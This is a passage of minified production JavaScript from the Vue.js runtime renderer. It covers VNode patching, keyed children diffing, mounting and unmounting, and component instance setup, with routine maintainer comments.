          y,
          v,
          x
        );
        break;
      default:
        S & 1 ? G(
          c,
          u,
          d,
          b,
          g,
          m,
          y,
          v,
          x
        ) : S & 6 ? Pt(
          c,
          u,
          d,
          b,
          g,
          m,
          y,
          v,
          x
        ) : (S & 64 || S & 128) && _.process(
          c,
          u,
          d,
          b,
          g,
          m,
          y,
          v,
          x,
          lt
        );
    }
    T != null && g ? _t(T, c && c.ref, m, u || c, !u) : T == null && c && c.ref != null && _t(c.ref, null, m, c, !0);
  }, X = (c, u, d, b) => {
    if (c == null)
      n(
        u.el = l(u.children),
        d,
        b
      );
    else {
      const g = u.el = c.el;
      u.children !== c.children && h(g, u.children);
    }
  }, D = (c, u, d, b) => {
    c == null ? n(
      u.el = f(u.children || ""),
      d,
      b
    ) : u.el = c.el;
  }, W = (c, u, d, b) => {
    [c.el, c.anchor] = P(
      c.children,
      u,
      d,
      b,
      c.el,
      c.anchor
    );
  }, K = ({ el: c, anchor: u }, d, b) => {
    let g;
    for (; c && c !== u; )
      g = w(c), n(c, d, b), c = g;
    n(u, d, b);
  }, A = ({ el: c, anchor: u }) => {
    let d;
    for (; c && c !== u; )
      d = w(c), i(c), c = d;
    i(u);
  }, G = (c, u, d, b, g, m, y, v, x) => {
    if (u.type === "svg" ? y = "svg" : u.type === "math" && (y = "mathml"), c == null)
      Pe(
        u,
        d,
        b,
        g,
        m,
        y,
        v,
        x
      );
    else {
      const _ = c.el && c.el._isVueCE ? c.el : null;
      try {
        _ && _._beginPatch(), It(
          c,
          u,
          g,
          m,
          y,
          v,
          x
        );
      } finally {
        _ && _._endPatch();
      }
    }
  }, Pe = (c, u, d, b, g, m, y, v) => {
    let x, _;
    const { props: T, shapeFlag: S, transition: E, dirs: O } = c;
    if (x = c.el = o(
      c.type,
      m,
      T && T.is,
      T
    ), S & 8 ? a(x, c.children) : S & 16 && Re(
      c.children,
      x,
      null,
      b,
      g,
      ds(c, m),
      y,
      v
    ), O && Ke(c, null, b, "created"), de(x, c, c.scopeId, y, b), T) {
      for (const $ in T)
        $ !== "value" && !pt($) && r(x, $, null, T[$], m, b);
      "value" in T && r(x, "value", null, T.value, m), (_ = T.onVnodeBeforeMount) && _e(_, b, c);
    }
    O && Ke(c, null, b, "beforeMount");
    const R = _o(g, E);
    R && E.beforeEnter(x), n(x, u, d), ((_ = T && T.onVnodeMounted) || R || O) && le(() => {
      _ && _e(_, b, c), R && E.enter(x), O && Ke(c, null, b, "mounted");
    }, g);
  }, de = (c, u, d, b, g) => {
    if (d && C(c, d), b)
      for (let m = 0; m < b.length; m++)
        C(c, b[m]);
    if (g) {
      let m = g.subTree;
      if (u === m || wi(m.type) && (m.ssContent === u || m.ssFallback === u)) {
        const y = g.vnode;
        de(
          c,
          y,
          y.scopeId,
          y.slotScopeIds,
          g.parent
        );
      }
    }
  }, Re = (c, u, d, b, g, m, y, v, x = 0) => {
    for (let _ = x; _ < c.length; _++) {
      const T = c[_] = v ? je(c[_]) : ve(c[_]);
      F(
        null,
        T,
        u,
        d,
        b,
        g,
        m,
        y,
        v
      );
    }
  }, It = (c, u, d, b, g, m, y) => {
    const v = u.el = c.el;
    let { patchFlag: x, dynamicChildren: _, dirs: T } = u;
    x |= c.patchFlag & 16;
    const S = c.props || U, E = u.props || U;
    let O;
    if (d && qe(d, !1), (O = E.onVnodeBeforeUpdate) && _e(O, d, u, c), T && Ke(u, c, d, "beforeUpdate"), d && qe(d, !0), (S.innerHTML && E.innerHTML == null || S.textContent && E.textContent == null) && a(v, ""), _ ? Ue(
      c.dynamicChildren,
      _,
      v,
      d,
      b,
      ds(u, g),
      m
    ) : y || N(
      c,
      u,
      v,
      null,
      d,
      b,
      ds(u, g),
      m,
      !1
    ), x > 0) {
      if (x & 16)
        rt(v, S, E, d, g);
      else if (x & 2 && S.class !== E.class && r(v, "class", null, E.class, g), x & 4 && r(v, "style", S.style, E.style, g), x & 8) {
        const R = u.dynamicProps;
        for (let $ = 0; $ < R.length; $++) {
          const L = R[$], ne = S[L], ie = E[L];
          (ie !== ne || L === "value") && r(v, L, ne, ie, g, d);
        }
      }
      x & 1 && c.children !== u.children && a(v, u.children);
    } else !y && _ == null && rt(v, S, E, d, g);
    ((O = E.onVnodeUpdated) || T) && le(() => {
      O && _e(O, d, u, c), T && Ke(u, c, d, "updated");
    }, b);
  }, Ue = (c, u, d, b, g, m, y) => {
    for (let v = 0; v < u.length; v++) {
      const x = c[v], _ = u[v], T = (
        // oldVNode may be an errored async setup() component inside Suspense
        // which will not have a mounted element
        x.el && // - In the case of a Fragment, we need to provide the actual parent
        // of the Fragment itself so it can move its children.
        (x.type === xe || // - In the case of different nodes, there is going to be a replacement
        // which also requires the correct parent container
        !at(x, _) || // - In the case of a component, it could contain anything.
        x.shapeFlag & 198) ? p(x.el) : (
          // In other cases, the parent container is not actually used so we
          // just pass the block element here to avoid a DOM parentNode call.
          d
        )
      );
      F(
        x,
        _,
        T,
        null,
        b,
        g,
        m,
        y,
        !0
      );
    }
  }, rt = (c, u, d, b, g) => {
    if (u !== d) {
      if (u !== U)
        for (const m in u)
          !pt(m) && !(m in d) && r(
            c,
            m,
            u[m],
            null,
            g,
            b
          );
      for (const m in d) {
        if (pt(m)) continue;
        const y = d[m], v = u[m];
        y !== v && m !== "value" && r(c, m, v, y, g, b);
      }
      "value" in d && r(c, "value", u.value, d.value, g);
    }
  }, Mt = (c, u, d, b, g, m, y, v, x) => {
    const _ = u.el = c ? c.el : l(""), T = u.anchor = c ? c.anchor : l("");
    let { patchFlag: S, dynamicChildren: E, slotScopeIds: O } = u;
    O && (v = v ? v.concat(O) : O), c == null ? (n(_, d, b), n(T, d, b), Re(
      // #10007
      // such fragment like `<></>` will be compiled into
      // a fragment which doesn't have a children.
      // In this case fallback to an empty array
      u.children || [],
      d,
      T,
      g,
      m,
      y,
      v,
      x
    )) : S > 0 && S & 64 && E && // #2715 the previous fragment could've been a BAILed one as a result
    // of renderSlot() with no valid children
    c.dynamicChildren && c.dynamicChildren.length === E.length ? (Ue(
      c.dynamicChildren,
      E,
      d,
      g,
      m,
      y,
      v
    ), // #2080 if the stable fragment has a key, it's a <template v-for> that may
    //  get moved around. Make sure all root level vnodes inherit el.
    // #2134 or if it's a component root, it may also get moved around
    // as the component is being moved.
    (u.key != null || g && u === g.subTree) && xi(
      c,
      u,
      !0
      /* shallow */
    )) : N(
      c,
      u,
      d,
      T,
      g,
      m,
      y,
      v,
      x
    );
  }, Pt = (c, u, d, b, g, m, y, v, x) => {
    u.slotScopeIds = v, c == null ? u.shapeFlag & 512 ? g.ctx.activate(
      u,
      d,
      b,
      y,
      x
    ) : ns(
      u,
      d,
      b,
      g,
      m,
      y,
      x
    ) : zs(c, u, x);
  }, ns = (c, u, d, b, g, m, y) => {
    const v = c.component = Oo(
      c,
      b,
      g
    );
    if (ni(c) && (v.ctx.renderer = lt), Mo(v, !1, y), v.asyncDep) {
      if (g && g.registerDep(v, Q, y), !c.el) {
        const x = v.subTree = fe(Ve);
        D(null, x, u, d), c.placeholder = x.el;
      }
    } else
      Q(
        v,
        c,
        u,
        d,
        g,
        m,
        y
      );
  }, zs = (c, u, d) => {
    const b = u.component = c.component;
    if (oo(c, u, d))
      if (b.asyncDep && !b.asyncResolved) {
        B(b, u, d);
        return;
      } else
        b.next = u, b.update();
    else
      u.el = c.el, b.vnode = u;
  }, Q = (c, u, d, b, g, m, y) => {
    const v = () => {
      if (c.isMounted) {
        let { next: S, bu: E, u: O, parent: R, vnode: $ } = c;
        {
          const ge = vi(c);
          if (ge) {
            S && (S.el = $.el, B(c, S, y)), ge.asyncDep.then(() => {
              c.isUnmounted || v();
            });
            return;
          }
        }
        let L = S, ne;
        qe(c, !1), S ? (S.el = $.el, B(c, S, y)) : S = $, E && os(E), (ne = S.props && S.props.onVnodeBeforeUpdate) && _e(ne, R, S, $), qe(c, !0);
        const ie = an(c), pe = c.subTree;
        c.subTree = ie, F(
          pe,
          ie,
          // parent may have changed if it's in a teleport
          p(pe.el),
          // anchor may have changed if it's in a fragment
          Ft(pe),
          c,
          g,
          m
        ), S.el = ie.el, L === null && lo(c, ie.el), O && le(O, g), (ne = S.props && S.props.onVnodeUpdated) && le(
          () => _e(ne, R, S, $),
          g
        );
      } else {
        let S;
        const { el: E, props: O } = u, { bm: R, m: $, parent: L, root: ne, type: ie } = c, pe = bt(u);
        qe(c, !1), R && os(R), !pe && (S = O && O.onVnodeBeforeMount) && _e(S, L, u), qe(c, !0);
        {
          ne.ce && // @ts-expect-error _def is private
          ne.ce._def.shadowRoot !== !1 && ne.ce._injectChildStyle(ie);
          const ge = c.subTree = an(c);
          F(
            null,
            ge,
            d,
            b,
            c,
            g,
            m
          ), u.el = ge.el;
        }
        if ($ && le($, g), !pe && (S = O && O.onVnodeMounted)) {
          const ge = u;
          le(
            () => _e(S, L, ge),
            g
          );
        }
        (u.shapeFlag & 256 || L && bt(L.vnode) && L.vnode.shapeFlag & 256) && c.a && le(c.a, g), c.isMounted = !0, u = d = b = null;
      }
    };
    c.scope.on();
    const x = c.effect = new Dn(v);
    c.scope.off();
    const _ = c.update = x.run.bind(x), T = c.job = x.runIfDirty.bind(x);
    T.i = c, T.id = c.uid, x.scheduler = () => Ws(T), qe(c, !0), _();
  }, B = (c, u, d) => {
    u.component = c;
    const b = c.vnode.props;
    c.vnode = u, c.next = null, fo(c, u.props, b, d), po(c, u.children, d), Ae(), rn(c), Oe();
  }, N = (c, u, d, b, g, m, y, v, x = !1) => {
    const _ = c && c.children, T = c ? c.shapeFlag : 0, S = u.children, { patchFlag: E, shapeFlag: O } = u;
    if (E > 0) {
      if (E & 128) {
        Rt(
          _,
          S,
          d,
          b,
          g,
          m,
          y,
          v,
          x
        );
        return;
      } else if (E & 256) {
        We(
          _,
          S,
          d,
          b,
          g,
          m,
          y,
          v,
          x
        );
        return;
      }
    }
    O & 8 ? (T & 16 && ot(_, g, m), S !== _ && a(d, S)) : T & 16 ? O & 16 ? Rt(
      _,
      S,
      d,
      b,
      g,
      m,
      y,
      v,
      x
    ) : ot(_, g, m, !0) : (T & 8 && a(d, ""), O & 16 && Re(
      S,
      d,
      b,
      g,
      m,
      y,
      v,
      x
    ));
  }, We = (c, u, d, b, g, m, y, v, x) => {
    c = c || Qe, u = u || Qe;
    const _ = c.length, T = u.length, S = Math.min(_, T);
    let E;
    for (E = 0; E < S; E++) {
      const O = u[E] = x ? je(u[E]) : ve(u[E]);
      F(
        c[E],
        O,
        d,
        null,
        g,
        m,
        y,
        v,
        x
      );
    }
    _ > T ? ot(
      c,
      g,
      m,
      !0,
      !1,
      S
    ) : Re(
      u,
      d,
      b,
      g,
      m,
      y,
      v,
      x,
      S
    );
  }, Rt = (c, u, d, b, g, m, y, v, x) => {
    let _ = 0;
    const T = u.length;
    let S = c.length - 1, E = T - 1;
    for (; _ <= S && _ <= E; ) {
      const O = c[_], R = u[_] = x ? je(u[_]) : ve(u[_]);
      if (at(O, R))
        F(
          O,
          R,
          d,
          null,
          g,
          m,
          y,
          v,
          x
        );
      else
        break;
      _++;
    }
    for (; _ <= S && _ <= E; ) {
      const O = c[S], R = u[E] = x ? je(u[E]) : ve(u[E]);
      if (at(O, R))
        F(
          O,
          R,
          d,
          null,
          g,
          m,
          y,
          v,
          x
        );
      else
        break;
      S--, E--;
    }
    if (_ > S) {
      if (_ <= E) {
        const O = E + 1, R = O < T ? u[O].el : b;
        for (; _ <= E; )
          F(
            null,
            u[_] = x ? je(u[_]) : ve(u[_]),
            d,
            R,
            g,
            m,
            y,
            v,
            x
          ), _++;
      }
    } else if (_ > E)
      for (; _ <= S; )
        he(c[_], g, m, !0), _++;
    else {
      const O = _, R = _, $ = /* @__PURE__ */ new Map();
      for (_ = R; _ <= E; _++) {
        const oe = u[_] = x ? je(u[_]) : ve(u[_]);
        oe.key != null && $.set(oe.key, _);
      }
      let L, ne = 0;
      const ie = E - R + 1;
      let pe = !1, ge = 0;
      const ct = new Array(ie);
      for (_ = 0; _ < ie; _++) ct[_] = 0;
      for (_ = O; _ <= S; _++) {
        const oe = c[_];
        if (ne >= ie) {
          he(oe, g, m, !0);
          continue;
        }
        let me;
        if (oe.key != null)
          me = $.get(oe.key);
        else
          for (L = R; L <= E; L++)
            if (ct[L - R] === 0 && at(oe, u[L])) {
              me = L;
              break;
            }
        me === void 0 ? he(oe, g, m, !0) : (ct[me - R] = _ + 1, me >= ge ? ge = me : pe = !0, F(
          oe,
          u[me],
          d,
          null,
          g,
          m,
          y,
          v,
          x
        ), ne++);
      }
      const Zs = pe ? bo(ct) : Qe;
      for (L = Zs.length - 1, _ = ie - 1; _ >= 0; _--) {
        const oe = R + _, me = u[oe], Xs = u[oe + 1], Qs = oe + 1 < T ? (
          // #13559, #14173 fallback to el placeholder for unresolved async component
          Xs.el || yi(Xs)
        ) : b;
        ct[_] === 0 ? F(
          null,
          me,
          d,
          Qs,
          g,
          m,
          y,
          v,
          x
        ) : pe && (L < 0 || _ !== Zs[L] ? Be(me, d, Qs, 2) : L--);
      }
    }
  }, Be = (c, u, d, b, g = null) => {
    const { el: m, type: y, transition: v, children: x, shapeFlag: _ } = c;
    if (_ & 6) {
      Be(c.component.subTree, u, d, b);
      return;
    }
    if (_ & 128) {
      c.suspense.move(u, d, b);
      return;
    }
    if (_ & 64) {
      y.move(c, u, d, lt);
      return;
    }
    if (y === xe) {
      n(m, u, d);
      for (let S = 0; S < x.length; S++)
        Be(x[S], u, d, b);
      n(c.anchor, u, d);
      return;
    }
    if (y === hs) {
      K(c, u, d);
      return;
    }
    if (b !== 2 && _ & 1 && v)
      if (b === 0)
        v.beforeEnter(m), n(m, u, d), le(() => v.enter(m), g);
      else {
        const { leave: S, delayLeave: E, afterLeave: O } = v, R = () => {
          c.ctx.isUnmounted ? i(m) : n(m, u, d);
        }, $ = () => {
          m._isLeaving && m[Fr](
            !0
            /* cancelled */
          ), S(m, () => {
            R(), O && O();
          });
        };
        E ? E(m, R, $) : $();
      }
    else
      n(m, u, d);
  }, he = (c, u, d, b = !1, g = !1) => {
    const {
      type: m,
      props: y,
      ref: v,
      children: x,
      dynamicChildren: _,
      shapeFlag: T,
      patchFlag: S,
      dirs: E,
      cacheIndex: O
    } = c;
    if (S === -2 && (g = !1), v != null && (Ae(), _t(v, null, d, c, !0), Oe()), O != null && (u.renderCache[O] = void 0), T & 256) {
      u.ctx.deactivate(c);
      return;
    }
    const R = T & 1 && E, $ = !bt(c);
    let L;
    if ($ && (L = y && y.onVnodeBeforeUnmount) && _e(L, u, c), T & 6)
      Ii(c.component, d, b);
    else {
      if (T & 128) {
        c.suspense.unmount(d, b);
        return;
      }
      R && Ke(c, null, u, "beforeUnmount"), T & 64 ? c.type.remove(
        c,
        u,
        d,
        lt,
        b
      ) : _ && // #5154
      // when v-once is used inside a block, setBlockTracking(-1) marks the
      // parent block with hasOnce: true
      // so that it doesn't take the fast path during unmount - otherwise
      // components nested in v-once are never unmounted.
      !_.hasOnce && // #1153: fast path should not be taken for non-stable (v-for) fragments
      (m !== xe || S > 0 && S & 64) ? ot(
        _,
        u,
        d,
        !1,
        !0
      ) : (m === xe && S & 384 || !g && T & 16) && ot(x, u, d), b && ks(c);
    }
    ($ && (L = y && y.onVnodeUnmounted) || R) && le(() => {
      L && _e(L, u, c), R && Ke(c, null, u, "unmounted");
    }, d);
  }, ks = (c) => {
    const { type: u, el: d, anchor: b, transition: g } = c;
    if (u === xe) {
      Oi(d, b);
      return;
    }
    if (u === hs) {
      A(c);
      return;
    }
    const m = () => {
      i(d), g && !g.persisted && g.afterLeave && g.afterLeave();
    };
    if (c.shapeFlag & 1 && g && !g.persisted) {
      const { leave: y, delayLeave: v } = g, x = () => y(d, m);
      v ? v(c.el, m, x) : x();
    } else
      m();
  }, Oi = (c, u) => {
    let d;
    for (; c !== u; )
      d = w(c), i(c), c = d;
    i(u);
  }, Ii = (c, u, d) => {
    const { bum: b, scope: g, job: m, subTree: y, um: v, m: x, a: _ } = c;
    pn(x), pn(_), b && os(b), g.stop(), m && (m.flags |= 8, he(y, c, u, d)), v && le(v, u), le(() => {
      c.isUnmounted = !0;
    }, u);
  }, ot = (c, u, d, b = !1, g = !1, m = 0) => {
    for (let y = m; y < c.length; y++)
      he(c[y], u, d, b, g);
  }, Ft = (c) => {
    if (c.shapeFlag & 6)
      return Ft(c.component.subTree);
    if (c.shapeFlag & 128)
      return c.suspense.next();
    const u = w(c.anchor || c.el), d = u && u[Pr];
    return d ? w(d) : u;
  };
  let is = !1;
  const Ys = (c, u, d) => {
    let b;
    c == null ? u._vnode && (he(u._vnode, null, null, !0), b = u._vnode.component) : F(
      u._vnode || null,
      c,
      u,
      null,
      null,
      null,
      d
    ), u._vnode = c, is || (is = !0, rn(b), Zn(), is = !1);
  }, lt = {
    p: F,
    um: he,
    m: Be,
    r: ks,
    mt: ns,
    mc: Re,
    pc: N,
    pbc: Ue,
    n: Ft,
    o: e
  };
  return {
    render: Ys,
    hydrate: void 0,
    createApp: eo(Ys)
  };
}
function ds({ type: e, props: t }, s) {
  return s === "svg" && e === "foreignObject" || s === "mathml" && e === "annotation-xml" && t && t.encoding && t.encoding.includes("html") ? void 0 : s;
}
function qe({ effect: e, job: t }, s) {
  s ? (e.flags |= 32, t.flags |= 4) : (e.flags &= -33, t.flags &= -5);
}
function _o(e, t) {
  return (!e || e && !e.pendingBranch) && t && !t.persisted;
}
function xi(e, t, s = !1) {
  const n = e.children, i = t.children;
  if (M(n) && M(i))
    for (let r = 0; r < n.length; r++) {
      const o = n[r];
      let l = i[r];
      l.shapeFlag & 1 && !l.dynamicChildren && ((l.patchFlag <= 0 || l.patchFlag === 32) && (l = i[r] = je(i[r]), l.el = o.el), !s && l.patchFlag !== -2 && xi(o, l)), l.type === ss && (l.patchFlag !== -1 ? l.el = o.el : l.__elIndex = r + // take fragment start anchor into account
      (e.type === xe ? 1 : 0)), l.type === Ve && !l.el && (l.el = o.el);
    }
}
function bo(e) {
  const t = e.slice(), s = [0];
  let n, i, r, o, l;
  const f = e.length;
  for (n = 0; n < f; n++) {
    const h = e[n];
    if (h !== 0) {
      if (i = s[s.length - 1], e[i] < h) {
        t[n] = i, s.push(n);
        continue;
      }
      for (r = 0, o = s.length - 1; r < o; )
        l = r + o >> 1, e[s[l]] < h ? r = l + 1 : o = l;
      h < e[s[r]] && (r > 0 && (t[n] = s[r - 1]), s[r] = n);
    }
  }
  for (r = s.length, o = s[r - 1]; r-- > 0; )
    s[r] = o, o = t[o];
  return s;
}
function vi(e) {
  const t = e.subTree.component;
  if (t)
    return t.asyncDep && !t.asyncResolved ? t : vi(t);
}
function pn(e) {
  if (e)
    for (let t = 0; t < e.length; t++)
      e[t].flags |= 8;
}
function yi(e) {
  if (e.placeholder)
    return e.placeholder;
  const t = e.component;
  return t ? yi(t.subTree) : null;
}
const wi = (e) => e.__isSuspense;
function xo(e, t) {
  t && t.pendingBranch ? M(e) ? t.effects.push(...e) : t.effects.push(e) : Er(e);
}
const xe = /* @__PURE__ */ Symbol.for("v-fgt"), ss = /* @__PURE__ */ Symbol.for("v-txt"), Ve = /* @__PURE__ */ Symbol.for("v-cmt"), hs = /* @__PURE__ */ Symbol.for("v-stc"), vt = [];
let ce = null;
function Ze(e = !1) {
  vt.push(ce = e ? null : []);
}
function vo() {
  vt.pop(), ce = vt[vt.length - 1] || null;
}
let Et = 1;
function Gt(e, t = !1) {
  Et += e, e < 0 && ce && t && (ce.hasOnce = !0);
}
function Si(e) {
  return e.dynamicChildren = Et > 0 ? ce || Qe : null, vo(), Et > 0 && ce && ce.push(e), e;
}
function ut(e, t, s, n, i, r) {
  return Si(
    z(
      e,
      t,
      s,
      n,
      i,
      r,
      !0
    )
  );
}
function yo(e, t, s, n, i) {
  return Si(
    fe(
      e,
      t,
      s,
      n,
      i,
      !0
    )
  );
}
function Jt(e) {
  return e ? e.__v_isVNode === !0 : !1;
}
function at(e, t) {
  return e.type === t.type && e.key === t.key;
}
const Ci = ({ key: e }) => e ?? null, $t = ({
  ref: e,
  ref_key: t,
  ref_for: s
}) => (typeof e == "number" && (e = "" + e), e != null ? J(e) || /* @__PURE__ */ Z(e) || I(e) ? { i: ye, r: e, k: t, f: !!s } : e : null);
function z(e, t = null, s = null, n = 0, i = null, r = e === xe ? 0 : 1, o = !1, l = !1) {
  const f = {
    __v_isVNode: !0,
    __v_skip: !0,
    type: e,
    props: t,
    key: t && Ci(t),
    ref: t && $t(t),
    scopeId: Qn,
    slotScopeIds: null,
    children: s,
    component: null,
    suspense: null,
    ssContent: null,
    ssFallback: null,
    dirs: null,
    transition: null,
    el: null,
    anchor: null,
    target: null,
    targetStart: null,
    targetAnchor: null,
    staticCount: 0,
    shapeFlag: r,
    patchFlag: n,
    dynamicProps: i,
    dynamicChildren: null,
    appContext: null,
    ctx: ye
  };
  return l ? (Gs(f, s), r & 128 && e.normalize(f)) : s && (f.shapeFlag |= J(s) ? 8 : 16), Et > 0 && // avoid a block node from tracking itself
  !o && // has current parent block
  ce && // presence of a patch flag indicates this node needs patching on updates.
  // component nodes also should always be patched, because even if the
  // component doesn't need to update, it needs to persist the instance on to
  // the next vnode so that it can be properly unmounted later.
  (f.patchFlag > 0 || r & 6) && // the EVENTS flag is only for hydration and if it is the only flag, the
  // vnode should not be considered dynamic due to handler caching.
  f.patchFlag !== 32 && ce.push(f), f;
}
const fe = wo;
function wo(e, t = null, s = null, n = 0, i = null, r = !1) {
  if ((!e || e === Gr) && (e = Ve), Jt(e)) {
    const l = nt(
      e,
      t,
      !0
      /* mergeRef: true */
    );
    return s && Gs(l, s), Et > 0 && !r && ce && (l.shapeFlag & 6 ? ce[ce.indexOf(e)] = l : ce.push(l)), l.patchFlag = -2, l;
  }
  if (Do(e) && (e = e.__vccOpts), t) {
    t = So(t);
    let { class: l, style: f } = t;
    l && !J(l) && (t.class = Rs(l)), q(f) && (/* @__PURE__ */ Us(f) && !M(f) && (f = k({}, f)), t.style = Ps(f));
  }
  const o = J(e) ? 1 : wi(e) ? 128 : Rr(e) ? 64 : q(e) ? 4 : I(e) ? 2 : 0;
  return z(
    e,
    t,
    s,
    n,
    i,
    o,
    r,
    !0
  );
}
function So(e) {
  return e ? /* @__PURE__ */ Us(e) || hi(e) ? k({}, e) : e : null;
}
function nt(e, t, s = !1, n = !1) {
  const { props: i, ref: r, patchFlag: o, children: l, transition: f } = e, h = t ? Eo(i || {}, t) : i, a = {
    __v_isVNode: !0,
    __v_skip: !0,
    type: e.type,
    props: h,
    key: h && Ci(h),
    ref: t && t.ref ? (
      // #2078 in the case of <component :is="vnode" ref="extra"/>
      // if the vnode itself already has a ref, cloneVNode will need to merge
      // the refs so the single vnode can be set on multiple refs
      s && r ? M(r) ? r.concat($t(t)) : [r, $t(t)] : $t(t)
    ) : r,
    scopeId: e.scopeId,
    slotScopeIds: e.slotScopeIds,
    children: l,
    target: e.target,
    targetStart: e.targetStart,
    targetAnchor: e.targetAnchor,
    staticCount: e.staticCount,
    shapeFlag: e.shapeFlag,
    // if the vnode is cloned with extra props, we can no longer assume its
    // existing patch flag to be reliable and need to add the FULL_PROPS flag.
    // note: preserve flag for fragments since they use the flag for children
    // fast paths only.
    patchFlag: t && e.type !== xe ? o === -1 ? 16 : o | 16 : o,
    dynamicProps: e.dynamicProps,
    dynamicChildren: e.dynamicChildren,
    appContext: e.appContext,
    dirs: e.dirs,
    transition: f,
    // These should technically only be non-null on mounted VNodes. However,
    // they *should* be copied for kept-alive vnodes. So we just always copy
    // them since them being non-null during a mount doesn't affect the logic as
    // they will simply be overwritten.
    component: e.component,
    suspense: e.suspense,
    ssContent: e.ssContent && nt(e.ssContent),
    ssFallback: e.ssFallback && nt(e.ssFallback),
    placeholder: e.placeholder,
    el: e.el,
    anchor: e.anchor,
    ctx: e.ctx,
    ce: e.ce
  };
  return f && n && Bs(
    a,
    f.clone(a)
  ), a;
}
function Xe(e = " ", t = 0) {
  return fe(ss, null, e, t);
}
function Co(e = "", t = !1) {
  return t ? (Ze(), yo(Ve, null, e)) : fe(Ve, null, e);
}
function ve(e) {
  return e == null || typeof e == "boolean" ? fe(Ve) : M(e) ? fe(
    xe,
    null,
    // #3666, avoid reference pollution when reusing vnode
    e.slice()
  ) : Jt(e) ? je(e) : fe(ss, null, String(e));
}
function je(e) {
  return e.el === null && e.patchFlag !== -1 || e.memo ? e : nt(e);
}
function Gs(e, t) {
  let s = 0;
  const { shapeFlag: n } = e;
  if (t == null)
    t = null;
  else if (M(t))
    s = 16;
  else if (typeof t == "object")
    if (n & 65) {
      const i = t.default;
      i && (i._c && (i._d = !1), Gs(e, i()), i._c && (i._d = !0));
      return;
    } else {
      s = 32;
      const i = t._;
      !i && !hi(t) ? t._ctx = ye : i === 3 && ye && (ye.slots._ === 1 ? t._ = 1 : (t._ = 2, e.patchFlag |= 1024));
    }
  else I(t) ? (t = { default: t, _ctx: ye }, s = 32) : (t = String(t), n & 64 ? (s = 16, t = [Xe(t)]) : s = 8);
  e.children = t, e.shapeFlag |= s;
}
function Eo(...e) {
  const t = {};
  for (let s = 0; s < e.length; s++) {
    const n = e[s];
    for (const i in n)
      if (i === "class")
        t.class !== n.class && (t.class = Rs([t.class, n.class]));
      else if (i === "style")
        t.style = Ps([t.style, n.style]);
      else if (kt(i)) {
        const r = t[i], o = n[i];
        o && r !== o && !(M(r) && r.includes(o)) && (t[i] = r ? [].concat(r, o) : o);
      } else i !== "" && (t[i] = n[i]);
  }
  return t;
}
function _e(e, t, s, n = null) {
  Se(e, t, 7, [
    s,
    n
  ]);
}
const To = fi();
let Ao = 0;
function Oo(e, t, s) {
  const n = e.type, i = (t ? t.appContext : e.appContext) || To, r = {
    uid: Ao++,
    vnode: e,
    type: n,
    parent: t,
    appContext: i,
    root: null,
    // to be immediately set
    next: null,
    subTree: null,
    // will be set synchronously right after creation
    effect: null,
    update: null,
    // will be set synchronously right after creation
    job: null,
    scope: new Gi(
      !0
      /* detached */
    ),
    render: null,
    proxy: null,
    exposed: null,
    exposeProxy: null,
    withProxy: null,
    provides: t ? t.provides : Object.create(i.provides),
    ids: t ? t.ids : ["", 0, 0],
    accessCache: null,
    renderCache: [],
    // local resolved assets
    components: null,
    directives: null,
    // resolved props and emits options
    propsOptions: gi(n, i),
    emitsOptions: ui(n, i),
    // emit
    emit: null,
    // to be set immediately
    emitted: null,
    // props default value
    propsDefaults: U,
    // inheritAttrs
    inheritAttrs: n.inheritAttrs,
    // state
    ctx: U,
    data: U,
    props: U,
    attrs: U,
    slots: U,
    refs: U,
    setupState: U,
    setupContext: null,
    // suspense related
    suspense: s,
    suspenseId: s ? s.pendingId : 0,
    asyncDep: null,
    asyncResolved: !1,
    // lifecycle hooks
    // not using enums here because it results in computed properties
    isMounted: !1,
    isUnmounted: !1,
    isDeactivated: !1,
    bc: null,
    c: null,
    bm: null,
    m: null,
    bu: null,
    u: null,
    um: null,
    bum: null,
    da: null,
    a: null,
    rtg: null,
    rtc: null,
    ec: null,
    sp: null
  };
  return r.ctx = { _: r }, r.root = t ? t.root : r, r.emit = so.bind(null, r), e.ce && e.ce(r), r;
}
let se = null;
const Io = () => se || ye;
let zt, Es;
{
  const e = Xt(), t = (s, n) => {
    let i;
    return (i = e[s]) || (i = e[s] = []), i.push(n), (r) => {
      i.length > 1 ? i.forEach((o) => o(r)) : i[0](r);
    };
  };
  zt = t(
    "__VUE_INSTANCE_SETTERS__",
    (s) => se = s
  ), Es = t(
    "__VUE_SSR_SETTERS__",
    (s) => Tt = s
  );
}
const Ot = (e) => {
  const t = se;
  return zt(e), e.scope.on(), () => {
    e.scope.off(), zt(t);
  };
}, gn = () => {
  se && se.scope.off(), zt(null);
};
function Ei(e) {
  return e.vnode.shapeFlag & 4;
}
let Tt = !1;
function Mo(e, t = !1, s = !1) {
  t && Es(t);
  const { props: n, children: i } = e.vnode, r = Ei(e);
  co(e, n, r, t), ho(e, i, s || t);
  const o = r ? Po(e, t) : void 0;
  return t && Es(!1), o;
}
function Po(e, t) {
  const s = e.type;
  e.accessCache = /* @__PURE__ */ Object.create(null), e.proxy = new Proxy(e.ctx, Jr);
  const { setup: n } = s;
  if (n) {
    Ae();
    const i = e.setupContext = n.length > 1 ? Fo(e) : null, r = Ot(e), o = At(
      n,
      e,
      0,
      [
        e.props,
        i
      ]
    ), l = Mn(o);
    if (Oe(), r(), (l || e.sp) && !bt(e) && si(e), l) {
      if (o.then(gn, gn), t)
        return o.then((f) => {
          mn(e, f);
        }).catch((f) => {
          Qt(f, e, 0);
        });
      e.asyncDep = o;
    } else
      mn(e, o);
  } else
    Ti(e);
}
function mn(e, t, s) {
  I(t) ? e.type.__ssrInlineRender ? e.ssrRender = t : e.render = t : q(t) && (e.setupState = zn(t)), Ti(e);
}
function Ti(e, t, s) {
  const n = e.type;
  e.render || (e.render = n.render || we);
  {
    const i = Ot(e);
    Ae();
    try {
      zr(e);
    } finally {
      Oe(), i();
    }
  }
}
const Ro = {
  get(e, t) {
    return Y(e, "get", ""), e[t];
  }
};
function Fo(e) {
  const t = (s) => {
    e.exposed = s || {};
  };
  return {
    attrs: new Proxy(e.attrs, Ro),
    slots: e.slots,
    emit: e.emit,
    expose: t
  };
}
function Js(e) {
  return e.exposed ? e.exposeProxy || (e.exposeProxy = new Proxy(zn(hr(e.exposed)), {
    get(t, s) {
      if (s in t)
        return t[s];
      if (s in xt)
        return xt[s](e);
    },
    has(t, s) {
      return s in t || s in xt;
    }
  })) : e.proxy;
}
function Do(e) {
  return I(e) && "__vccOpts" in e;
}
const jo = (e, t) => /* @__PURE__ */ xr(e, t, Tt);
function Ho(e, t, s) {
  try {
    Gt(-1);
    const n = arguments.length;
